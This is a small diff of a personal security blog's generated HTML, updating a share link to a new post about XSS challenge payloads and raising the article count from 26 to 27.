-      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjo725jco0011qgvjbr7sw6jx" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjopao6h6001blsvjwm68xtpq" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -813,7 +814,7 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>26</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>27</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>12</strong><br>标签</div></a>
     </div>
